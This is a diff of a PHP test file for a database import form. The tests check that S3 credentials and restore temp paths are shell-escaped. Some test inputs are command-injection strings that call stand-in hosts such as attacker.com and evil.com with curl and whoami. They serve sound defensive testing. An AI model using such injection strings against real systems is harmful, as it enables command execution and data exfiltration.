@@ -1,8 +1,14 @@
 <?php
 
+use App\Livewire\Project\Database\ImportForm;
+use App\Models\StandaloneMariadb;
+use App\Models\StandaloneMongodb;
+use App\Models\StandaloneMysql;
+use App\Models\StandalonePostgresql;
+
 it('escapeshellarg properly escapes S3 credentials with shell metacharacters', function () {
     // Test that escapeshellarg works correctly for various malicious inputs
-    // This is the core security mechanism used in Import.php line 407-410
+    // This is the core security mechanism used by ImportForm.
 
     // Test case 1: Secret with command injection attempt
     $maliciousSecret = 'secret";curl https://attacker.com/ -X POST --data `whoami`;echo "pwned';
@@ -41,7 +47,7 @@ it('escapeshellarg properly escapes S3 credentials with shell metacharacters', f
 });
 
 it('verifies command injection is prevented in mc alias set command format', function () {
-    // Simulate the exact scenario from Import.php:407-410
+    // Simulate the exact scenario from ImportForm.
     $containerName = 's3-restore-test-uuid';
     $endpoint = 'https://s3.example.com";curl http://evil.com;echo "';
     $key = 'AKIATEST";whoami;"';
@@ -96,3 +102,80 @@ it('handles S3 secrets with single quotes correctly', function () {
     // The command should contain the properly escaped secret
     expect($command)->toContain("'my'\\''secret'\\''key'");
 });
+
+it('quotes restore command temp paths with spaces', function (string $morphClass) {
+    $component = new class extends ImportForm
+    {
+        public string $morphClass;
+
+        public function __get($property)
+        {
+            if ($property === 'resource') {
+                return new class($this->morphClass)
+                {
+                    public function __construct(private readonly string $morphClass) {}
+
+                    public function getMorphClass(): string
+                    {
+                        return $this->morphClass;
+                    }
+                };
+            }
+
+            return parent::__get($property);
+        }
+    };
+    $component->morphClass = $morphClass;
+
+    $tmpPath = '/tmp/restore_test-may 2026.sql.gz';
+    $restoreCommand = $component->buildRestoreCommand($tmpPath);
+
+    expect($restoreCommand)
+        ->toContain(escapeshellarg($tmpPath))
+        ->not->toContain(" {$tmpPath}");
+})->with([
+    'mariadb' => StandaloneMariadb::class,
+    'mysql' => StandaloneMysql::class,
+    'postgresql' => StandalonePostgresql::class,
+    'mongodb' => StandaloneMongodb::class,
+]);
+
+it('quotes dump all restore command temp paths with spaces', function (string $morphClass) {
+    $component = new class extends ImportForm
+    {
+        public string $morphClass;
+
+        public function __get($property)
+        {
+            if ($property === 'resource') {
+                return new class($this->morphClass)
+                {
+                    public function __construct(private readonly string $morphClass) {}
+
+                    public function getMorphClass(): string
+                    {
+                        return $this->morphClass;
+                    }
+                };
+            }
+
+            return parent::__get($property);
+        }
+    };
+    $component->morphClass = $morphClass;
+    $component->dumpAll = true;
+
+    $tmpPath = '/tmp/restore_test-may 2026.sql.gz';
+    $escapedTmpPath = escapeshellarg($tmpPath);
+    $restoreCommand = $component->buildRestoreCommand($tmpPath);
+
+    expect($restoreCommand)
+        ->toContain("gunzip -cf {$escapedTmpPath}")
+        ->toContain("cat {$escapedTmpPath}")
+        ->not->toContain("gunzip -cf {$tmpPath}")
+        ->not->toContain("cat {$tmpPath}");
+})->with([
+    'mariadb' => StandaloneMariadb::class,
+    'mysql' => StandaloneMysql::class,
+    'postgresql' => StandalonePostgresql::class,
+]);
